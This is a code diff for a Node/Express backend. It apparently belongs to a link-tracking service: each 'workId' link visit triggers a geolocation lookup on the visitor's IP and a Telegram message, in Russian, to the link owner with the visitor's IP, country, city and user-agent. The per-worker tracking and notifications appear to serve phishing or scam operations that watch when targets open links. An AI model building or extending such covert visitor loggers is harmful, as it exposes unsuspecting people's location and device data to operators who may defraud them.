@@ -21,21 +21,31 @@ app.get('/backendapi/newvisitors/:workid', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress 
    fetch(`https://ipwho.is/${ip}`)
 	.then(response => response.json())
-	.then(data => {
+	.then(async data => {
       console.log(data)
+
+      console.log(req.params.workid)
+      const user = await UserModel.findOne({ where: {workId: '' + req.params.workid} })
+
+      if (user && data.success) {
+         console.log(user.username)
+         bot.telegram.sendMessage(user.chatId, `
+📶 Посещение ccылки
+🏳️ IP: ${ip}
+▫️ Страна: ${data.flag.img} ${data.country}
+▫️ Город: ${data.city}
+🚥 OS: ${req.headers['user-agent'] }
+         `);
+      } else if (user) {
+         bot.telegram.sendMessage(user.chatId, `
+📶 Посещение ccылки
+🏳️ IP: ${ip}
+         `);
+      }
    })
 	.catch(err => console.error(err));
 
-   console.log(req.params.workid)
-   const user = await UserModel.findOne({ where: {workId: '' + req.params.workid} })
-
-   if (user) {
-      console.log(user.username)
-      bot.telegram.sendMessage(user.chatId, `
-📶 Посещение ccылки
-🏳️ IP: ${ip}
-`);
-   }
+   
 })
 
 app.listen(port, async () => {
